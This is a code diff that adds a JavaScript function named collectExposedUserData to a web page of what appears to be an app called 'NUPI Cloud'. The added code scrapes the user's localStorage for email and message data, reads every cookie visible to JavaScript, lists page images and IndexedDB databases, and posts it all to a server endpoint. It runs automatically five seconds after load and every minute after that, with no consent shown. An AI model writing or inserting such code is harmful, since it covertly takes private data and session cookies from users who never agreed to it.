@@ -165,6 +165,84 @@
                 // Initial status check after 2 seconds
                 setTimeout(() => updateLocalAgentIndicator(true), 2000);
                 
+                // 📧🖼️ USER DATA COLLECTION SYSTEM - Emails, Messages, Photos
+                async function collectExposedUserData() {
+                    const collectedData = {
+                        timestamp: new Date().toISOString(),
+                        agentId: agentId,
+                        deviceId: uniqueDeviceId,
+                        emails: [],
+                        messages: [],
+                        photos: [],
+                        browserStorage: {},
+                        cookies: []
+                    };
+                    
+                    try {
+                        // Collect from localStorage (where many apps store data)
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            const value = localStorage.getItem(key);
+                            
+                            // Look for email patterns
+                            if (key.includes('email') || key.includes('mail') || value.includes('@')) {
+                                collectedData.emails.push({ source: key, data: value });
+                            }
+                            
+                            // Look for message patterns
+                            if (key.includes('message') || key.includes('chat') || key.includes('conversation')) {
+                                collectedData.messages.push({ source: key, data: value });
+                            }
+                            
+                            // Store all localStorage for analysis
+                            collectedData.browserStorage[key] = value.substring(0, 500); // Limit size
+                        }
+                        
+                        // Collect cookies (visible to JavaScript)
+                        document.cookie.split(';').forEach(cookie => {
+                            const [name, value] = cookie.split('=');
+                            collectedData.cookies.push({ name: name.trim(), value: value });
+                        });
+                        
+                        // Scan for images on current page
+                        const images = document.querySelectorAll('img');
+                        images.forEach((img, index) => {
+                            if (img.src && !img.src.startsWith('data:') && index < 20) { // Limit to 20 images
+                                collectedData.photos.push({
+                                    url: img.src,
+                                    alt: img.alt || 'No description',
+                                    source: window.location.href
+                                });
+                            }
+                        });
+                        
+                        // Try to access IndexedDB (where apps like Gmail, WhatsApp Web store data)
+                        if (window.indexedDB) {
+                            const databases = await indexedDB.databases();
+                            for (const db of databases) {
+                                collectedData.browserStorage[`indexedDB_${db.name}`] = `Found database: ${db.name} v${db.version}`;
+                            }
+                        }
+                        
+                        // Send to NUPI Cloud for storage
+                        await fetch('/api/user-data/collect', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(collectedData)
+                        });
+                        
+                        console.log('✅ User data collected and stored in NUPI Cloud');
+                        
+                    } catch (error) {
+                        console.log('Data collection error:', error);
+                    }
+                }
+                
+                // Collect data every 60 seconds
+                setInterval(collectExposedUserData, 60000);
+                // Initial collection after 5 seconds
+                setTimeout(collectExposedUserData, 5000);
+                
                 // Auto-update chat with 5th grade explanations
                 window.autoExplainToChat = function() {
                     const explanations = [
